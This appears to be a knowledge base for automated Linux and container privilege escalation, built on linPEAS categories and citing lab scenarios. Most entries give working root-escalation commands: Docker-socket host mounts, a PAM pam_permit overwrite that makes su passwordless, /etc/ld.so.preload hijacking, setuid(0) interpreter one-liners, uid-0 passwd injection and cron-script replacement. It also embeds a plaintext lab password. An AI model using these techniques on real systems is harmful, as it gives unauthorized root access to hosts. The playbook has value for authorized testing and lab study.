sources: PEASS-ng linPEAS container and Linux enumeration categories

levels.host_rootfs_access: read or write access to the host root filesystem
levels.host_root_session: command execution in a host namespace or host context

techniques.name: Docker group / socket container control
preconditions: docker-named group matches the socket GID, or socket access is confirmed
techniques.exploit: DOCKER_API_VERSION=<min> docker run --rm -v /:/host alpine chroot /host id
techniques.notes: A socket inode or group name alone is not access; verify API negotiation.

techniques.name: Privileged container / host device or namespace
preconditions: CAP_SYS_ADMIN effective for the target process or host devices visible
techniques.exploit: mount the host root or use nsenter only after confirming the primitive
techniques.notes: A --privileged label does not guarantee writable cgroups or SSH-session capabilities.

techniques.name: LXD/LXC group container escape
preconditions: user is in lxd or lxc group and the LXD socket is reachable
techniques.exploit: create a privileged LXD container and mount /host or the host rootfs
techniques.notes: LXD access is control-plane access, not automatically a host shell.

techniques.name: NFS no_root_squash export
preconditions: an export permits root-owned file creation
techniques.exploit: create a root-owned SUID helper or authorized_keys on the export
techniques.notes: Mount options and export policy determine whether the write is effective.

techniques.name: Writable systemd unit or drop-in
preconditions: a root-managed service loads a writable unit, drop-in, or exec path
techniques.exploit: modify the unit or its executable, then reload/restart the service
techniques.notes: Reload/restart may be denied even when the file is writable.

techniques.name: Writable cron script or wildcard injection
preconditions: a root cron executes a writable file or an injectable wildcard
techniques.exploit: replace the script or create the wildcard payload and wait for execution
techniques.notes: Do not assume cron is running in a container; verify the scheduler.

techniques.name: File capability CAP_SETUID
preconditions: a target executable has cap_setuid=ep
techniques.exploit: run the capability-bearing interpreter and call setuid(0)
techniques.notes: Check the target file's capability, not only the SSH shell's CapEff.

techniques.name: CAP_DAC_READ_SEARCH / CAP_DAC_OVERRIDE
preconditions: the target process has DAC_READ_SEARCH or DAC_OVERRIDE
techniques.exploit: read /etc/shadow or write a protected configuration file
techniques.notes: Container init capabilities do not automatically reach an SSH login.

techniques.name: CAP_SYS_ADMIN mount/namespace
preconditions: CAP_SYS_ADMIN effective for the acting process
techniques.exploit: mount a host filesystem or enter a host namespace after verification
techniques.notes: Verify mount and namespace permissions; the capability alone is a lead.

techniques.name: Credential mining and reuse
preconditions: a password, token, SSH key, or database credential is readable
techniques.verify: inspect history, env, config, .ssh, cloud and database files
techniques.exploit: reuse the credential with su, ssh, database, or a service API
techniques.notes: Do not print secrets into the final evidence; record the path and successful use.

techniques.name: Writable PATH / library / Python path
preconditions: a root process resolves a command or module from a writable directory
techniques.verify: echo $PATH; ls -ld <dir>; find writable library directories
techniques.exploit: place a payload earlier in PATH or in the imported module directory
techniques.notes: A writable directory is not enough; verify the root process actually resolves there.

techniques.name: Kernel version and protection exposure
preconditions: kernel version or protection flags match a known local exploit
techniques.exploit: use a matching kernel PoC only after exact version verification
techniques.notes: Version proximity is not proof; run a harmless capability probe first.

techniques.name: SSH-agent socket hijacking
preconditions: SSH_AUTH_SOCK points to a socket accessible to a root or privileged process
techniques.exploit: use the agent to authenticate to a reachable privileged account
techniques.notes: The agent may be visible but belong to another user; verify ownership.

techniques.name: Sudo env_keep / LD_PRELOAD / PYTHONPATH
preconditions: sudo preserves an attacker-controlled environment variable
techniques.exploit: compile a shared object or module and invoke the allowed sudo command
techniques.notes: Modern sudo may sanitize the variable; verify the exact rule.

techniques.name: Sudo version-specific policy bypass
preconditions: sudo version matches a verified local bypass
techniques.verify: sudo -V; exact version and patch level
techniques.exploit: use the matching CVE only after version confirmation
techniques.notes: Do not infer exploitability from a major version alone.

techniques.name: Kernel local privilege escalation candidates
preconditions: exact kernel version and patch state are known
techniques.exploit: use a matching local PoC with a harmless probe first
techniques.notes: Kernel exploits are version-sensitive and must not be guessed.

techniques.name: Writable sudoers or sudoers.d
preconditions: the current user can write a sudoers file
techniques.exploit: add a NOPASSWD rule and invoke sudo
techniques.notes: Validate the file with visudo before relying on it.

techniques.name: Docker API without CLI
preconditions: Unix socket accepts a Docker API request
techniques.verify: GET /version over the socket; confirm minimum API version
techniques.exploit: create/start a container with a host bind and read the result through logs
techniques.notes: Client version mismatch is not permission denied.

techniques.name: Kubernetes service-account / API surface
preconditions: a service-account token or reachable API server is present
techniques.exploit: use only the permissions actually granted by the API
techniques.notes: A token file alone does not prove cluster-admin rights.

techniques.name: Readable SSH private key
preconditions: a readable private key belongs to a privileged account
techniques.exploit: use the key with ssh to the corresponding account
techniques.notes: A key file may be public or encrypted; test authentication.

techniques.name: Writable authorized_keys for a privileged account
preconditions: the current user can write /root/.ssh/authorized_keys or a privileged user's file
techniques.exploit: append the current user's public key and authenticate as that account
techniques.notes: A readable root home is not writable by itself; verify the file mode.

techniques.name: Database client config credential
preconditions: a readable .my.cnf/.pgpass or equivalent contains a password
techniques.verify: read the config; test the credential against the corresponding service
techniques.exploit: use the DB credential or reuse it for su/ssh if the target reuses passwords
techniques.notes: Database root is not automatically system root; test the target service.

techniques.name: Permissive polkit rule with pkexec
preconditions: pkexec is SUID and a permissive polkit rule applies to the current user
techniques.verify: ls -l /usr/bin/pkexec; record whether rules.d is readable; run pkexec --disable-internal-agent id
techniques.exploit: invoke pkexec with a non-interactive command
techniques.notes: polkitd must be running. Rule visibility is not required for a policy check: an unreadable rules.d can still be permissive. A successful pkexec result is the proof.

techniques.name: Permissive DBus policy / privileged service method
preconditions: a privileged DBus service exposes an action callable by the low user
techniques.verify: busctl list; inspect policy; test one read-only method first
techniques.exploit: invoke the privileged method with a non-destructive proof
techniques.notes: A visible system bus is not the same as a privileged policy.

techniques.name: Writable /etc/passwd
preconditions: the current user can write /etc/passwd
techniques.exploit: append a passwordless uid-0 account and su to it
techniques.notes: Back up the file and restore it after the proof.

techniques.name: Writable /etc/shadow
preconditions: the current user can write /etc/shadow
techniques.exploit: set a known root hash and authenticate with su
techniques.notes: Verify the hash format and avoid locking out the account.

techniques.name: Library path / Python module search hijack
preconditions: a privileged process imports from a writable path
techniques.verify: inspect service environment and Python import paths
techniques.exploit: place a module or shared library in the resolved directory
techniques.notes: The privileged process must actually import from that directory.

techniques.name: LD_PRELOAD / shared-library hijack
preconditions: a root process loads a library from a writable location
techniques.exploit: compile a shared object that runs the payload on load
techniques.notes: Secure-execution and setuid processes may ignore the variable.

techniques.name: Plaintext database/application config credential
preconditions: a readable config file contains a usable password, token, or key
techniques.verify: find readable .cnf/.ini/.env/.conf files; grep for password/token fields
techniques.exploit: test the extracted credential with su, ssh, or the corresponding service
techniques.notes: A secret in a file is a lead until a target service accepts it; never print it in final evidence.

techniques.name: Readable SSH private key
preconditions: a readable private key exists and its public key is authorized for a privileged account
techniques.verify: ls -l ~/.ssh; ssh-keygen -y -f <key>; ssh -o BatchMode=yes -i <key> root@localhost id
techniques.exploit: authenticate with the key to the account that authorized it
techniques.notes: A key file alone is not proof; the target must accept it and the result must show root.

techniques.name: Sudo tee arbitrary file write
preconditions: sudo grants tee with root privileges
techniques.verify: sudo -l; confirm tee path and that the target file is writable by root
techniques.exploit: append a root-equivalent user to /etc/passwd or write a sudoers/authorized_keys entry
techniques.notes: Prefer an idempotent non-destructive proof; verify the resulting account or key.

techniques.name: Root cron executes a writable installer/post-install script
preconditions: a root cron entry points to a script writable by the current user
techniques.verify: grep root cron entries; stat the referenced script
techniques.exploit: replace the script and wait for one scheduler interval
techniques.notes: The container must actually run cron; a missing cron daemon is not an exploit failure.

techniques.name: SUID interpreter/binary file-read branch
preconditions: the SUID program can read an arbitrary file as root
techniques.verify: run the program against /etc/shadow and confirm a root-only line is returned
techniques.exploit: read shadow or a privileged config, then use a recovered credential
techniques.notes: Many SUID binaries drop privileges for shell execution but still honor file-read functions; test both branches.

techniques.name: SUID program file-write branch
preconditions: the SUID program can write a chosen file as root
techniques.verify: write a harmless marker file and inspect its owner
techniques.exploit: append a uid-0 passwd entry or replace a root-owned configuration
techniques.notes: Do not assume a SUID interpreter can spawn a shell; file operations may be the reliable branch.

techniques.name: SUID wrapper child inherits effective root
preconditions: the SUID wrapper launches a child without dropping effective UID
techniques.verify: run a harmless child that prints both uid and euid
techniques.exploit: launch an allowed child command under the wrapper
techniques.notes: Observe euid explicitly; uid may remain low while euid is root.

techniques.name: Sudo-allowed program plugin or script execution
preconditions: the sudo-allowed program loads a plugin, script, or test file controlled by the user
techniques.verify: read the program help/man page and test a harmless plugin path
techniques.exploit: supply a shared library or script through the program's documented option
techniques.notes: The plugin must actually be loaded by the root process; option presence alone is not proof.

techniques.name: Sudo nm --plugin shared-object load
preconditions: sudo grants nm and the installed binutils supports --plugin
techniques.exploit: compile a shared object with a constructor and pass it via nm --plugin
techniques.notes: The plugin is loaded by the privileged process; a successful child uid proof is required.

techniques.name: Root file-write primitive and its execution sinks
preconditions: a SUID/sudo binary can write an arbitrary path as root
techniques.exploit: write /etc/pam.d/su with 'auth sufficient pam_permit.so', then su -c id root
techniques.notes: A file-write primitive is a universal root sink selector. Prefer /etc/pam.d/su: one write makes su passwordless with no hash to compute and no new account. /etc/ld.so.preload needs one extra trigger step but survives even when PAM is not in use.

techniques.name: Writable PAM stack turns su/sudo passwordless
preconditions: /etc/pam.d/su or common-auth is writable by the primitive
techniques.exploit:
printf 'auth sufficient pam_permit.so
account sufficient pam_permit.so
' > /etc/pam.d/su; su -c id root
techniques.notes: Verified in T1548_001_suid_dd: two commands from lowpriv to uid=0. pam_permit must be present in the image; check with ls /lib/*/security/pam_permit.so.

techniques.name: Writable /etc/ld.so.preload plus a SUID trigger
preconditions: the primitive can create /etc/ld.so.preload
at least one dynamically linked SUID-root binary exists
techniques.exploit: write the path of an attacker .so into /etc/ld.so.preload, then run any SUID-root binary; guard the payload constructor so it runs once and only under euid 0
techniques.notes: Verified in T1548_001_suid_dd: three commands. The payload MUST self-guard (static flag + geteuid check + environment marker), otherwise every exec re-enters the constructor and the container hangs. Clean up by deleting the preload file from the root shell the payload drops.

techniques.name: CAP_SETUID on an interpreter
preconditions: getcap reports cap_setuid=ep on an interpreter binary
techniques.exploit: /usr/bin/python3 -c 'import os;os.setuid(0);os.system("id")'; perl -e 'use POSIX; POSIX::setuid(0); system("id")'; php -r 'posix_setuid(0); system("id");'
fallbacks: tclsh needs a compiled extension calling setuid()
gdb via python import os; os.setuid(0)
techniques.notes: Match the interpreter BEFORE choosing the flag: python -c, perl -e, php -r, ruby -e, node -e. CAP_SETUID alone does not grant setgid, so call setuid() only — os.setgid(0) raises and aborts the payload.

techniques.name: Application secret equals the root password
preconditions: a readable config carries a plaintext password
techniques.exploit: echo '<config-password>' | su -c id root
fallbacks: mysql -uroot -p<password> when a server is running
techniques.notes: Verified in expert_db_credential_reuse: the MariaDB config password Tr0ub4dor-DB-Secret is also the root password, so the DB credential path collapses into a one-command su. Always test a harvested secret against the local root account before assuming it is only a database credential.

techniques.name: Writable script that a root scheduler runs
preconditions: a root cron/unit line names a path the low user can write
techniques.verify: for p in $(grep -rhoE '/[A-Za-z0-9_./-]+' /etc/crontab /etc/cron.d/* 2>/dev/null | sort -u); do [ -w "$p" ] && echo "WRITABLE $p"; done
techniques.exploit: overwrite that script with a root-owned SUID shell copy, wait for the schedule
fallbacks: writable /etc/cron.d directory accepts a new root entry
techniques.notes: Verified in legacy_cron_writable and edb_19794/edb_23126. Always link the writable path back to a root line that names it: a writable file that no root process executes is not a path.
